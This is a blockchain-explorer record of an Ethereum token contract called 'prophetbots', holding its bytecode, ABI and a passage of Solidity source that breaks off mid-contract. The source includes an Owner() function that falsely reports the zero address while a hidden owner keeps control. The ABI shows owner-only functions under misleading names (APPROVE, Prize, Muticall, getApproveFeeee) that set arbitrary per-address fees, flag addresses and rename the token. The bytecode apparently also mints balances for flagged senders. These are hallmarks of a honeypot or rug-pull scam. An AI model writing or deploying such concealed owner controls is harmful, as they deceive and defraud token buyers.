{
    "address": "0xb4F77c4Cb758aeA0364f50892D20E267be9805c4",
    "tx_hash": "dcf1adec38efa36aea938562801d95ad3597f3f7183daffa7ec6e916d07b7f25",
    "block_number": 18000429,
    "timestamp": 1693072055,
    "gas_used_in_creation": 3914443,
    "creation_bytecode": "60e0604052600b60a09081526a50726f70686574626f747360a81b60c0526008906200002c90826200058b565b50604080518082019091526007815266141493d412115560ca1b60208201526009906200005a90826200058b565b505f600a555f600b553480156200006f575f80fd5b50600880546200007f90620004ff565b80601f0160208091040260200160405190810160405280929190818152602001828054620000ad90620004ff565b8015620000fc5780601f10620000d257610100808354040283529160200191620000fc565b820191905f5260205f20905b815481529060010190602001808311620000de57829003601f168201915b5050505050600980546200011090620004ff565b80601f01602080910402602001604051908101604052809291908181526020018280546200013e90620004ff565b80156200018d5780601f1062000163576101008083540402835291602001916200018d565b820191905f5260205f20905b8154815290600101906020018083116200016f57829003601f168201915b50505050508160029081620001a391906200058b565b506003620001b282826200058b565b505050620001cf620001c9620003a760201b60201c565b620003ab565b737a250d5630b4cf539739df2c5dacb4c659f2488d60808190526040805163c45a015560e01b81529051829163c45a01559160048083019260209291908290030181865afa15801562000224573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906200024a919062000653565b6001600160a01b031663c9c6539630836001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000296573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190620002bc919062000653565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af115801562000307573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906200032d919062000653565b600780546001600160a01b0319166001600160a01b03929092169190911790556200037d336200035b601290565b6200036890600a62000791565b6200037790620f4240620007a1565b620003fc565b506005600a819055600b55335f908152600660205260409020805460ff19166001179055620007d1565b3390565b600480546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0905f90a35050565b6001600160a01b038216620004615760405162461bcd60e51b815260206004820152602160248201527f45524332303a2052455741524420746f20746865207a65726f206164647265736044820152607360f81b606482015260840160405180910390fd5b8060015f828254620004749190620007bb565b90915550506001600160a01b0382165f9081526005602052604081208054839290620004a2908490620007bb565b90915550506040518181526001600160a01b038316905f907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a35050565b634e487b7160e01b5f52604160045260245ffd5b600181811c908216806200051457607f821691505b6020821081036200053357634e487b7160e01b5f52602260045260245ffd5b50919050565b601f82111562000586575f81815260208120601f850160051c81016020861015620005615750805b601f850160051c820191505b8181101562000582578281556001016200056d565b5050505b505050565b81516001600160401b03811115620005a757620005a7620004eb565b620005bf81620005b88454620004ff565b8462000539565b602080601f831160018114620005f5575f8415620005dd5750858301515b5f19600386901b1c1916600185901b17855562000582565b5f85815260208120601f198616915b82811015620006255788860151825594840194600190910190840162000604565b50858210156200064357878501515f19600388901b60f8161c191681555b5050505050600190811b01905550565b5f6020828403121562000664575f80fd5b81516001600160a01b03811681146200067b575f80fd5b9392505050565b634e487b7160e01b5f52601160045260245ffd5b600181815b80851115620006d657815f1904821115620006ba57620006ba62000682565b80851615620006c857918102915b93841c93908002906200069b565b509250929050565b5f82620006ee575060016200078b565b81620006fc57505f6200078b565b8160018114620007155760028114620007205762000740565b60019150506200078b565b60ff84111562000734576200073462000682565b50506001821b6200078b565b5060208310610133831016604e8410600b841016171562000765575081810a6200078b565b62000771838362000696565b805f190482111562000787576200078762000682565b0290505b92915050565b5f6200067b60ff841683620006de565b80820281158282048414176200078b576200078b62000682565b808201808211156200078b576200078b62000682565b6080516113a6620007ea5f395f61019d01526113a65ff3fe608060405234801561000f575f80fd5b5060043610610153575f3560e01c80636c9992b3116100bf578063a9059cbb11610079578063a9059cbb146102f0578063b4a99a4e14610303578063c4e7c16514610309578063d32c99cd1461031c578063dd62ed3e1461032f578063f2fde38b14610365575f80fd5b80636c9992b31461027f57806370a0823114610292578063715018a6146102ba57806380602410146102c257806395d89b41146102d5578063a457c2d7146102dd575f80fd5b80632c91d071116101105780632c91d07114610211578063313ce5671461022457806339509351146102335780633de94b451461024657806349bd5a5e146102595780635dd7c8ac1461026c575f80fd5b806306fdde0314610157578063095ea7b3146101755780631694505e1461019857806318160ddd146101d75780631f478f1e146101e957806323b872dd146101fe575b5f80fd5b61015f610378565b60405161016c9190610f2c565b60405180910390f35b610188610183366004610f54565b610408565b604051901515815260200161016c565b6101bf7f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b03909116815260200161016c565b6001545b60405190815260200161016c565b6101fc6101f7366004610f7c565b610421565b005b61018861020c366004610fb5565b61047e565b6101fc61021f366004610fee565b6104a1565b6040516012815260200161016c565b610188610241366004610f54565b6104ed565b6101fc610254366004611007565b610529565b6007546101bf906001600160a01b031681565b6101db61027a366004610fee565b610558565b61018861028d366004610fee565b6105a3565b6101db6102a0366004610fee565b6001600160a01b03165f9081526005602052604090205490565b6101fc6105ed565b6101886102d0366004610fee565b610622565b61015f61066c565b6101886102eb366004610f54565b61067b565b6101886102fe366004610f54565b61070a565b5f6101bf565b6101fc610317366004610f54565b61076a565b6101fc61032a3660046110bb565b6107af565b6101db61033d36600461111b565b6001600160a01b039182165f9081526020818152604080832093909416825291909152205490565b6101fc610373366004610fee565b610832565b6060600880546103879061114c565b80601f01602080910402602001604051908101604052809291908181526020018280546103b39061114c565b80156103fe5780601f106103d5576101008083540402835291602001916103fe565b820191905f5260205f20905b8154815290600101906020018083116103e157829003601f168201915b5050505050905090565b5f336104158185856108cd565b60019150505b92915050565b6004546001600160a01b031633146104545760405162461bcd60e51b815260040161044b90611184565b60405180910390fd5b6001600160a01b03919091165f908152600c60205260409020805460ff1916911515919091179055565b5f3361048b8582856109ee565b610496858585610a7c565b506001949350505050565b6004546001600160a01b031633146104cb5760405162461bcd60e51b815260040161044b90611184565b600780546001600160a01b0319166001600160a01b0392909216919091179055565b335f818152602081815260408083206001600160a01b038716845290915281205490919061041590829086906105249087906111cd565b6108cd565b6004546001600160a01b031633146105535760405162461bcd60e51b815260040161044b90611184565b600a55565b6004545f906001600160a01b031633146105845760405162461bcd60e51b815260040161044b90611184565b506001600160a01b0381165f908152600d60205260409020545b919050565b6004545f906001600160a01b031633146105cf5760405162461bcd60e51b815260040161044b90611184565b506001600160a01b03165f9081526006602052604090205460ff1690565b6004546001600160a01b031633146106175760405162461bcd60e51b815260040161044b90611184565b6106205f610e28565b565b6004545f906001600160a01b0316331461064e5760405162461bcd60e51b815260040161044b90611184565b506001600160a01b03165f908152600c602052604090205460ff1690565b6060600980546103879061114c565b335f818152602081815260408083206001600160a01b0387168452909152812054909190838110156106fd5760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b606482015260840161044b565b61049682868684036108cd565b335f8181526006602052604081205490919060ff16151560010361075f576001600160a01b0384165f908152600560205260408120805485929061074f9084906111cd565b909155506001925061041b915050565b610415818585610a7c565b6004546001600160a01b031633146107945760405162461bcd60e51b815260040161044b90611184565b6001600160a01b039091165f908152600d6020526040902055565b6004546001600160a01b031633146107d95760405162461bcd60e51b815260040161044b90611184565b60086107e5838261122e565b5060096107f2828261122e565b507f6c5d2637118cb4115becb3c3e6e553db25400cb3ffe8fd6fb2a2b4e014338627828233604051610826939291906112ea565b60405180910390a15050565b6004546001600160a01b0316331461085c5760405162461bcd60e51b815260040161044b90611184565b6001600160a01b0381166108c15760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577204f776e657220697320746865207a65726f206160448201526564647265737360d01b606482015260840161044b565b6108ca81610e28565b50565b6001600160a01b03831661092f5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b606482015260840161044b565b6001600160a01b0382166109905760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b606482015260840161044b565b6001600160a01b038381165f818152602081815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038381165f90815260208181526040808320938616835292905220545f198114610a765781811015610a695760405162461bcd60e51b815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000604482015260640161044b565b610a7684848484036108cd565b50505050565b6001600160a01b038316610ae05760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b606482015260840161044b565b6001600160a01b038216610b425760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b606482015260840161044b565b6001600160a01b0383165f9081526005602052604090205481811015610bb95760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220416d6f756e7420657863656564732062604482015265616c616e636560d01b606482015260840161044b565b6001610bc58585610e79565b15610bcd57505f5b5f8115610c6d576007545f906001600160a01b031615610c1d576007546001600160a01b0390811690871603610c025750600a545b6007546001600160a01b0390811690881603610c1d5750600b545b6001600160a01b0387165f908152600d602052604090205415610c5457506001600160a01b0386165f908152600d60205260409020545b610c696064610c638784610ebd565b90610ec8565b9150505b8015610d58576001600160a01b0386165f90815260056020526040902054610c959082610ed3565b6001600160a01b0387165f9081526005602052604081209190915561dead90527f7d509c07f0d4edcc2dd1b53aae68677132eb562dcba78e36381b63ccaf66e6ba54610ce19082610ede565b61dead5f81905260056020527f7d509c07f0d4edcc2dd1b53aae68677132eb562dcba78e36381b63ccaf66e6ba919091556040516001600160a01b038816907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90610d4f9085815260200190565b60405180910390a35b610d83610d658286611327565b6001600160a01b0388165f9081526005602052604090205490610ed3565b6001600160a01b0387165f90815260056020526040902055610dc6610da88286611327565b6001600160a01b0387165f9081526005602052604090205490610ede565b6001600160a01b038087165f8181526005602052604090209290925587167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef610e0f8488611327565b60405190815260200160405180910390a3505050505050565b600480546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0905f90a35050565b6001600160a01b0382165f908152600c602052604081205460ff1680610eb657506001600160a01b0382165f908152600c602052604090205460ff165b9392505050565b5f610eb6828461133a565b5f610eb68284611351565b5f610eb68284611327565b5f610eb682846111cd565b5f81518084525f5b81811015610f0d57602081850181015186830182015201610ef1565b505f602082860101526020601f19601f83011685010191505092915050565b602081525f610eb66020830184610ee9565b80356001600160a01b038116811461059e575f80fd5b5f8060408385031215610f65575f80fd5b610f6e83610f3e565b946020939093013593505050565b5f8060408385031215610f8d575f80fd5b610f9683610f3e565b915060208301358015158114610faa575f80fd5b809150509250929050565b5f805f60608486031215610fc7575f80fd5b610fd084610f3e565b9250610fde60208501610f3e565b9150604084013590509250925092565b5f60208284031215610ffe575f80fd5b610eb682610f3e565b5f60208284031215611017575f80fd5b5035919050565b634e487b7160e01b5f52604160045260245ffd5b5f82601f830112611041575f80fd5b813567ffffffffffffffff8082111561105c5761105c61101e565b604051601f8301601f19908116603f011681019082821181831017156110845761108461101e565b8160405283815286602085880101111561109c575f80fd5b836020870160208301375f602085830101528094505050505092915050565b5f80604083850312156110cc575f80fd5b823567ffffffffffffffff808211156110e3575f80fd5b6110ef86838701611032565b93506020850135915080821115611104575f80fd5b5061111185828601611032565b9150509250929050565b5f806040838503121561112c575f80fd5b61113583610f3e565b915061114360208401610f3e565b90509250929050565b600181811c9082168061116057607f821691505b60208210810361117e57634e487b7160e01b5f52602260045260245ffd5b50919050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572604082015260600190565b634e487b7160e01b5f52601160045260245ffd5b8082018082111561041b5761041b6111b9565b601f821115611229575f81815260208120601f850160051c810160208610156112065750805b601f850160051c820191505b8181101561122557828155600101611212565b5050505b505050565b815167ffffffffffffffff8111156112485761124861101e565b61125c81611256845461114c565b846111e0565b602080601f83116001811461128f575f84156112785750858301515b5f19600386901b1c1916600185901b178555611225565b5f85815260208120601f198616915b828110156112bd5788860151825594840194600190910190840161129e565b50858210156112da57878501515f19600388901b60f8161c191681555b5050505050600190811b01905550565b606081525f6112fc6060830186610ee9565b828103602084015261130e8186610ee9565b91505060018060a01b0383166040830152949350505050565b8181038181111561041b5761041b6111b9565b808202811582820484141761041b5761041b6111b9565b5f8261136b57634e487b7160e01b5f52601260045260245ffd5b50049056fea26469706673582212206ad4b7877a599dfad1cfd9f3401b8766af9afe2cb1b586ee3222b43f4e0ef5c464736f6c63430008150033",
    "runtime_bytecode": "",
    "contract_name": "prophetbots",
    "compiler_version": "v0.8.21+commit.d9974bed",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"Owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"newName\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"string\",\"name\":\"newSymbol\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"by\",\"type\":\"address\"}],\"name\":\"NameChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"APPROVE\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_value\",\"type\":\"bool\"}],\"name\":\"Approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol\",\"type\":\"string\"}],\"name\":\"Muticall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"PairList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Prize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getApproveFeeee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getAprove\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getRelease\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]",
    "source_code": "/*\r\nWebsite https://prophetbots.com/\r\nTG https://t.me/+OEkQ_82xSRgwZTdk\r\nTW https://twitter.com/prophetbots\r\n\r\n*/\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity ^0.8.21;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _Owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    \r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    function Owner() public view virtual returns (address) {\r\n        return address(0);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_Owner == _msgSender(), \"Ownable: caller is not the Owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new Owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _Owner;\r\n        _Owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n   \r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            \r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n \r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountETH);\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n \r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\n\r\ncontract ERC20 is Context {\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 internal _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed Owner, address indexed spender, uint256 value);\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    \r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    \r\n    function symbol() public view virtual  returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    \r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    \r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    \r\n    function allowance(address Owner, address spender) public view virtual returns (uint256) {\r\n        return 